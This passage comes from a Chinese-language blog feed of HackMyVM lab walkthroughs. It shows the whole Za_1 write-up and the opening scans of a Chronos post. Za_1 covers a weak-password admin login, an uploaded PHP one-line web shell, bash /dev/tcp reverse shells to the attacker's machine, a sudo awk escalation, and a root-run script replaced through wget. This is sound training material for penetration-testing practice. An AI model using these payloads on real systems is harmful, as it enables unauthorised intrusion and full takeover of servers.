<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>,1000<span class="token punctuation">(</span>doro<span class="token punctuation">)</span></code></pre>
ok了老铁。</li>
</ol>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>Authorization，screen提权</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Za_1</title>
    <url>/posts/6c34648c/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.151</strong></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.151</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-14 <span class="token number">19</span>:44 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.151
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.000057s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
MAC Address: 08:00:27:8E:2D:10 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.16</span> seconds</code></pre>
<p>开启了22 80两个端口,应该不会太难</p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># gobuster dir -u http://192.168.56.151 -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.151
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              bak,zip,html,txt,php
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/index.php            <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">6842</span><span class="token punctuation">]</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/admin                <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">316</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.151/admin/<span class="token punctuation">]</span>
/install              <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">318</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.151/install/<span class="token punctuation">]</span>
/install.php          <span class="token punctuation">(</span>Status: <span class="token number">302</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.151/<span class="token punctuation">]</span>
/sql                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">314</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.151/sql/<span class="token punctuation">]</span>
/LICENSE.txt          <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">14974</span><span class="token punctuation">]</span>
/var                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">314</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.151/var/<span class="token punctuation">]</span>
/usr                  <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">314</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.56.151/usr/<span class="token punctuation">]</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/server-status        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
Progress: <span class="token number">1323360</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<h2 id="访问web"><a href="#访问web" class="headerlink" title="访问web"></a>访问web</h2><p><img src="https://ooo.0x0.ooo/2024/04/14/OmVVeL.png" alt="OmVVeL.png" loading="lazy"><br>界面好乱，盲猜没有域名解析<br>在源码里面发现了子域,添加到hosts<br><img src="https://ooo.0x0.ooo/2024/04/14/OmV9ht.png" alt="OmV9ht.png" loading="lazy"><br>添加hosts之后界面就很正常了<br><img src="https://ooo.0x0.ooo/2024/04/14/OmVjtx.png" alt="OmVjtx.png" loading="lazy"><br>根据之前扫出来的目录查看一下</p>
<h3 id="admin登录"><a href="#admin登录" class="headerlink" title="admin登录"></a>admin登录</h3><p><img src="https://ooo.0x0.ooo/2024/04/14/OmV2jj.png" alt="OmV2jj.png" loading="lazy"><br>弱口令测了一下admin&#x2F;123456登录成功<br><img src="https://ooo.0x0.ooo/2024/04/14/OmV8Wp.png" alt="OmV8Wp.png" loading="lazy"><br>在设置里面发现可以修改文件上传类型,大概率是可以利用文件上传，试了一下，php不能添加，可以添加phtml的后缀名<br><img src="https://ooo.0x0.ooo/2024/04/14/OmV3ov.png" alt="OmV3ov.png" loading="lazy"><br>在文章发布里面可以添加附件，上传一个phtml的一句话可以返回一个url</p>
<p><code>&lt;?=`$_GET[0]`;</code><br><img src="https://ooo.0x0.ooo/2024/04/14/OmVCrq.png" alt="OmVCrq.png" loading="lazy"><br>测试发现可以RCE<br><img src="https://ooo.0x0.ooo/2024/04/14/OmVwGc.png" alt="OmVwGc.png" loading="lazy"></p>
<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>利用一句话反弹个shell到kali</p>
<blockquote>
<p><a href="http://za1.hmv/usr/uploads/2024/04/3699184642.phtml?0=bash%20-c%20%27bash%20-i%20%3E&%20/dev/tcp/192.168.56.104/4567%20%200%3E&1%27">http://za1.hmv/usr/uploads/2024/04/3699184642.phtml?0=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.104%2F4567%20%200%3E%261%27</a></p>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4567      </span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.151<span class="token punctuation">]</span> <span class="token number">51314</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">933</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
www-data@za_1:/var/www/html/usr/uploads/2024/04$ <span class="token function">id</span>
<span class="token function">id</span>                                                                                                                                                                                                                                                           
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">(</span>www-data<span class="token punctuation">)</span>                                                                                                                                                                                                        
www-data@za_1:/var/www/html/usr/uploads/2024/04$ <span class="token builtin class-name">cd</span> /home                                                                                                                                                                                                    
<span class="token builtin class-name">cd</span> /home                                                                                                                                                                                                                                                     
www-data@za_1:/home$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>                                                                                                                                                                                                                                  
<span class="token function">ls</span> <span class="token parameter variable">-al</span>                                                                                                                                                                                                                                                       
total <span class="token number">12</span>                                                                                                                                                                                                                                                     
drwxr-xr-x  <span class="token number">3</span> root root <span class="token number">4096</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>                                                                                                                                                                                                                  
drwxr-xr-x <span class="token number">24</span> root root <span class="token number">4096</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>                                                                                                                                                                                                                 
drwxr-xr-x  <span class="token number">6</span> za_1 za_1 <span class="token number">4096</span> Aug <span class="token number">22</span>  <span class="token number">2023</span> za_1                                                                                                                                                                                                               
www-data@za_1:/home$ <span class="token builtin class-name">cd</span> za_1                                                                                                                                                                                                                                 
<span class="token builtin class-name">cd</span> za_1                                                                                                                                                                                                                                                      
www-data@za_1:/home/za_1$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>                                                                                                                                                                                                                             
<span class="token function">ls</span> <span class="token parameter variable">-al</span>                                                                                                                                                                                                                                                       
total <span class="token number">44</span>                                                                                                                                                                                                                                                     
drwxr-xr-x <span class="token number">6</span> za_1 za_1 <span class="token number">4096</span> Aug <span class="token number">22</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>                                                                                                                                                                                                                   
drwxr-xr-x <span class="token number">3</span> root root <span class="token number">4096</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>                                                                                                                                                                                                                  
lrwxrwxrwx <span class="token number">1</span> za_1 za_1    <span class="token number">9</span> Aug <span class="token number">22</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null                                                                                                                                                                                          
-rw-r--r-- <span class="token number">1</span> za_1 za_1  <span class="token number">220</span> Apr  <span class="token number">4</span>  <span class="token number">2018</span> .bash_logout                                                                                                                                                                                                        
-rw-r--r-- <span class="token number">1</span> za_1 za_1 <span class="token number">3771</span> Apr  <span class="token number">4</span>  <span class="token number">2018</span> .bashrc                                                                                                                                                                                                             
drwx------ <span class="token number">2</span> za_1 za_1 <span class="token number">4096</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> .cache                                                                                                                                                                                                              
drwx------ <span class="token number">3</span> za_1 za_1 <span class="token number">4096</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> .gnupg                                                                                                                                                                                                              
-rw-r--r-- <span class="token number">1</span> za_1 za_1  <span class="token number">807</span> Apr  <span class="token number">4</span>  <span class="token number">2018</span> .profile                                                                                                                                                                                                            
drwxr-xr-x <span class="token number">2</span> za_1 za_1 <span class="token number">4096</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> .root
drwx------ <span class="token number">2</span> za_1 za_1 <span class="token number">4096</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> .ssh
-rw-r--r-- <span class="token number">1</span> za_1 za_1    <span class="token number">0</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> .sudo_as_admin_successful
-rw------- <span class="token number">1</span> za_1 za_1  <span class="token number">991</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> .viminfo
-rw-r--r-- <span class="token number">1</span> za_1 za_1   <span class="token number">23</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> user.txt
www-data@za_1:/home/za_1$ <span class="token function">cat</span> user
<span class="token function">cat</span> user.txt 
flag<span class="token punctuation">&#123;</span>ThursD0y_v_wo_50<span class="token punctuation">&#125;</span></code></pre>
<p>也是直接拿到user flag，这个靶机应该是国人做的</p>
<h1 id="提权user"><a href="#提权user" class="headerlink" title="提权user"></a>提权user</h1><h2 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h2><p>sudo -l发现可以提权到za_1</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@za_1:/home/za_1$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> www-data on za_1:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin

User www-data may run the following commands on za_1:
    <span class="token punctuation">(</span>za_1<span class="token punctuation">)</span> NOPASSWD: /usr/bin/awk</code></pre>
<p>直接sudo -u za_1 &#x2F;usr&#x2F;bin&#x2F;awk ‘BEGIN {system(“&#x2F;bin&#x2F;sh”)}’拿到za_1的权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@za_1:/home/za_1$ <span class="token function">sudo</span> <span class="token parameter variable">-u</span> za_1 /usr/bin/awk <span class="token string">'BEGIN &#123;system("/bin/sh")&#125;'</span> 
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>za_1<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>za_1<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>za_1<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>sudo<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,108<span class="token punctuation">(</span>lxd<span class="token punctuation">)</span></code></pre>
<p>升级一下shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ python3 <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span></code></pre>
<h1 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h1><p>za_1目录下有个.root文件夹,里面有个back.sh所属root并且可以修改</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">za_1@za_1:~/.root$ <span class="token function">cat</span> back.sh
<span class="token comment">#!/bin/bash</span>


<span class="token function">cp</span> /var/www/html/usr/64c0dcaf26f51.db /var/www/html/sql/new.sql

<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span>/dev/tcp/10.0.2.18/999 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span></code></pre>
<p>竟然能直接反弹shell那就简单修改一下<br>直接从kali传个back.sh到靶机上然后执行就拿到了root权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">za_1@za_1:~/.root$ <span class="token function">wget</span> http://192.168.56.104:6677/back.sh
--2024-04-14 <span class="token number">12</span>:50:24--  http://192.168.56.104:6677/back.sh
Connecting to <span class="token number">192.168</span>.56.104:6677<span class="token punctuation">..</span>. connected.
HTTP request sent, awaiting response<span class="token punctuation">..</span>. <span class="token number">200</span> OK
Length: <span class="token number">123</span> <span class="token punctuation">[</span>text/x-sh<span class="token punctuation">]</span>
Saving to: <span class="token string">'back.sh'</span>

back.sh             <span class="token number">100</span>%<span class="token punctuation">[</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">]</span>     <span class="token number">123</span>  --.-KB/s    <span class="token keyword">in</span> 0s      

<span class="token number">2024</span>-04-14 <span class="token number">12</span>:50:24 <span class="token punctuation">(</span><span class="token number">295</span> KB/s<span class="token punctuation">)</span> - <span class="token string">'back.sh'</span> saved <span class="token punctuation">[</span><span class="token number">123</span>/123<span class="token punctuation">]</span>

za_1@za_1:~/.root$ <span class="token function">cat</span> back.sh 
<span class="token comment">#!/bin/bash</span>


<span class="token function">cp</span> /var/www/html/usr/64c0dcaf26f51.db /var/www/html/sql/new.sql

<span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span>/dev/tcp/192.168.56.104/4567 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span>
za_1@za_1:~/.root$ ./back.sh
bash: ./back.sh: Permission denied
za_1@za_1:~/.root$ <span class="token function">chmod</span> +x back.sh</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># vim back.sh   </span>
                                                                                                                                                                                                                                                      
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># python -m http.server 6677</span>
Serving HTTP on <span class="token number">0.0</span>.0.0 port <span class="token number">6677</span> <span class="token punctuation">(</span>http://0.0.0.0:6677/<span class="token punctuation">)</span> <span class="token punctuation">..</span>.
<span class="token number">192.168</span>.56.151 - - <span class="token punctuation">[</span><span class="token number">14</span>/Apr/2024 <span class="token number">20</span>:50:25<span class="token punctuation">]</span> <span class="token string">"GET /back.sh HTTP/1.1"</span> <span class="token number">200</span> -
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                                                                                                      
┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nc -lvnp 4567</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.151<span class="token punctuation">]</span> <span class="token number">45528</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">2152</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
root@za_1:~<span class="token comment"># ls -al</span>
<span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">60</span>
drwx------  <span class="token number">6</span> root root <span class="token number">4096</span> Aug <span class="token number">22</span>  <span class="token number">2023</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">24</span> root root <span class="token number">4096</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> <span class="token punctuation">..</span>
lrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">9</span> Aug <span class="token number">22</span>  <span class="token number">2023</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r--  <span class="token number">1</span> root root <span class="token number">3106</span> Apr  <span class="token number">9</span>  <span class="token number">2018</span> .bashrc
drwx------  <span class="token number">2</span> root root <span class="token number">4096</span> Aug <span class="token number">22</span>  <span class="token number">2023</span> .cache
drwx------  <span class="token number">3</span> root root <span class="token number">4096</span> Aug <span class="token number">22</span>  <span class="token number">2023</span> .gnupg
drwxr-xr-x  <span class="token number">3</span> root root <span class="token number">4096</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> .local
-rw-------  <span class="token number">1</span> root root  <span class="token number">154</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> .mysql_history
-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">148</span> Aug <span class="token number">17</span>  <span class="token number">2015</span> .profile
-rw-r--r--  <span class="token number">1</span> root root   <span class="token number">25</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> root.txt
-rw-r--r--  <span class="token number">1</span> root root   <span class="token number">75</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> .selected_editor
-rw-------  <span class="token number">1</span> root root  <span class="token number">137</span> Aug <span class="token number">22</span>  <span class="token number">2023</span> .sqlite_history
drwx------  <span class="token number">2</span> root root <span class="token number">4096</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> .ssh
-rw-------  <span class="token number">1</span> root root <span class="token number">9983</span> Jul <span class="token number">26</span>  <span class="token number">2023</span> .viminfo
root@za_1:~<span class="token comment"># cat root   </span>
<span class="token function">cat</span> root
cat: root: No such <span class="token function">file</span> or directory
root@za_1:~<span class="token comment"># cat r*</span>
<span class="token function">cat</span> r*</code></pre>
<p>果然是国人的靶场,root flag竟然是个qq群号</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>awk提权</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Chronos</title>
    <url>/posts/99a1cbb9/</url>
    <content><![CDATA[<p><strong>难度:Medium</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.185</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:ec:9f:2b       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.185  08:00:27:7a:75:94       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.923</span> seconds <span class="token punctuation">(</span><span class="token number">133.13</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>

<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.185
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-21 <span class="token number">17</span>:17 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.185
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00017s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">997</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp   <span class="token function">open</span>  http
<span class="token number">8000</span>/tcp <span class="token function">open</span>  http-alt
